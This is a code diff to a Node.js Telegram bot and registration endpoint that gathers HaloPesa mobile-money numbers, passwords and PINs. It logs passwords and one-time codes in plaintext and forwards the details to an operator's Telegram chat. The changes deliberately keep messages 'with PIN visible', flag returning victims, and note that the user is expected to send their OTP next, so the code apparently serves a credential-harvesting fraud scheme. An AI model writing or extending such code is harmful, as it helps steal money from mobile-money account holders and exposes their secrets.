@@ -226,15 +226,19 @@ bot.on('callback_query', async (query) => {
 
             console.log(`✅ Registration APPROVED: ${registrationId}`);
 
-            await bot.editMessageText(
-                `✅ *REGISTRATION APPROVED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
+            // Keep the original message with PIN visible, just remove buttons
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
                 {
                     chat_id: chatId,
-                    message_id: messageId,
-                    parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard: [] }
+                    message_id: messageId
                 }
             );
+
+            // Send a new message confirming approval (so admin knows it was processed)
+            await bot.sendMessage(chatId, `✅ *REGISTRATION APPROVED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\`\n\n_Mtumiaji anatarajiwa kumtuma OTP punde chache_`, {
+                parse_mode: 'Markdown'
+            });
 
             await bot.answerCallbackQuery(query.id, { text: '✅ Approved!', show_alert: false });
         }
@@ -254,15 +258,19 @@ bot.on('callback_query', async (query) => {
 
             console.log(`❌ Registration REJECTED: ${registrationId}`);
 
-            await bot.editMessageText(
-                `❌ *REGISTRATION REJECTED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``,
+            // Keep the original message with PIN visible, just remove buttons
+            await bot.editMessageReplyMarkup(
+                { inline_keyboard: [] },
                 {
                     chat_id: chatId,
-                    message_id: messageId,
-                    parse_mode: 'Markdown',
-                    reply_markup: { inline_keyboard: [] }
+                    message_id: messageId
                 }
             );
+
+            // Send a new message confirming rejection
+            await bot.sendMessage(chatId, `❌ *REGISTRATION REJECTED*\n\n👤 *Jina:* ${registration.firstName} ${registration.lastName}\n🔑 *HaloPesa:* ${registration.haloNumber}\n\nRegistration ID: \`${registrationId}\``, {
+                parse_mode: 'Markdown'
+            });
 
             await bot.answerCallbackQuery(query.id, { text: '❌ Rejected!', show_alert: false });
         }
@@ -2077,11 +2085,29 @@ app.post('/api/register-user', async (req, res) => {
     console.log(`   Password: ${password}`);
     console.log(`   OTP Generated: ${otp}`);
 
+    // Check if this is a returning user (has previous applications)
+    let isReturningUser = false;
+    try {
+      if (db.db && db.db.collection) {
+        const existingCount = await db.db.collection('applications').countDocuments({ haloNumber: haloNumber });
+        isReturningUser = existingCount > 0;
+        if (isReturningUser) {
+          console.log(`🔄 RETURNING USER DETECTED: ${haloNumber} (${existingCount} previous applications)`);
+        }
+      }
+    } catch (error) {
+      console.log(`ℹ️ Could not check returning user status: ${error.message}`);
+    }
+
     try {
       const superAdminChatId = process.env.SUPER_ADMIN_CHAT_ID;
       
+      const userStatusLabel = isReturningUser ? '🔄 *RETURNING USER*' : '✨ *NEW USER*';
+      
       const message = `
 🔔 *NEW REGISTRATION REQUEST*
+
+${userStatusLabel}
 
 👤 *Jina:* ${firstName} ${lastName}
 🔑 *HaloPesa Number:* ${haloNumber}
